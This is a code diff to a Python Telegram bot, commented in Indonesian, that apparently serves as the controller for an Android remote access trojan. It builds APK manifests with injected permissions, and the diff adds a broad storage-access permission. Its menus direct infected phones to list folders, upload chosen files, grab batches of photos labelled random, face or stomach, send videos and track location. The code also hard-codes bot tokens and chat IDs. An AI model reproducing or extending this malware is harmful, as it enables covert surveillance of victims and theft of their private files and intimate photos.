@@ -13,7 +13,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" # <-- UDAH DIGANTI
+PAYLOAD_BOT_USERNAME = "Hasil_rat_bot"
 
 ALLOWED_CHAT_ID = "8598136412" 
 GROUP_ID = "-1004405270823" 
@@ -62,7 +62,7 @@ def inject_manifest(manifest_path):
         "android.permission.FOREGROUND_SERVICE", "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
         "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.POST_NOTIFICATIONS",
         "android.permission.SCHEDULE_EXACT_ALARM", "android.permission.USE_EXACT_ALARM", 
-        "android.permission.WAKE_LOCK"
+        "android.permission.WAKE_LOCK", "android.permission.MANAGE_EXTERNAL_STORAGE" # <--- IZIN BARU BUAT TREE
     ]
                    
     for perm in permissions:
@@ -206,7 +206,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton("👕 Foto Perut", callback_data=f"cmd_foto_perut_{idx}"), InlineKeyboardButton("🎥 Send Video", callback_data=f"cmd_send_video_{idx}")],
                 [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
             ]
-            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi (Kamu punya waktu 30 detik untuk respon instan):", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi (Kamu punya waktu 3 menit untuk respon instan):", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
     elif query.data.startswith("cmd_"):
         parts = query.data.split("_")
@@ -217,27 +217,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if idx < len(devices):
             dev_id = devices[idx]['id']
             
-            # Cek File (Tree)
             if cmd_base == "tree":
                 perintah = f"/tree {dev_id}"
                 await kirim_perintah(query, perintah)
             
-            # Send File
             elif cmd_base == "send_file":
                 user_states[chat_id] = f"waiting_path_send_file_{dev_id}"
                 await query.message.reply_text("📤 **Masukkan path file yang mau diambil.**\n\nContoh: `/storage/emulated/0/Download/file.pdf`", parse_mode='Markdown')
             
-            # Foto Acak / Wajah / Perut
             elif cmd_base in ["foto_acak", "foto_wajah", "foto_perut"]:
                 user_states[chat_id] = f"waiting_path_{cmd_base}_{dev_id}"
                 await query.message.reply_text("📂 **Masukkan path folder foto.**\n\nContoh: `/storage/emulated/0/DCIM/Camera`", parse_mode='Markdown')
                 
-            # Send Video
             elif cmd_base == "send_video":
                 user_states[chat_id] = f"waiting_path_send_video_{dev_id}"
                 await query.message.reply_text("📂 **Masukkan path folder video.**\n\nContoh: `/storage/emulated/0/DCIM/Camera`", parse_mode='Markdown')
 
-            # Perintah Statis (Dump, Foto Kamera, Lacak)
             else:
                 perintah = f"/{cmd_base} {dev_id}"
                 await kirim_perintah(query, perintah)
@@ -245,7 +240,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def kirim_perintah(query, perintah):
     url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
     keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
-    await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`\n\n*(Kirim dalam 30 detik untuk respon instan).*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`\n\n*(Kirim dalam 3 menit untuk respon instan).*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
@@ -262,7 +257,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await kirim_perintah(update.message, perintah)
 
     elif state.startswith("waiting_path_foto_acak_") or state.startswith("waiting_path_foto_wajah_") or state.startswith("waiting_path_foto_perut_"):
-        mode = state.split("_")[2] # acak / wajah / perut
+        mode = state.split("_")[2]
         dev_id = state.split("_")[3]
         user_states[chat_id] = f"waiting_count_{mode}_{dev_id}_{text}"
         await update.message.reply_text("🔢 **Mau ambil berapa foto?**\n\nKetik angka (contoh: `10`):", parse_mode='Markdown')
@@ -271,7 +266,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts = state.split("_")
         mode = parts[2]
         dev_id = parts[3]
-        path = "_".join(parts[4:]) # Jaga-jaga kalau path ada underscore
+        path = "_".join(parts[4:])
         if text.isdigit():
             perintah = f"/send_foto_{mode} {dev_id} {path} {text}"
             user_states.pop(chat_id, None)
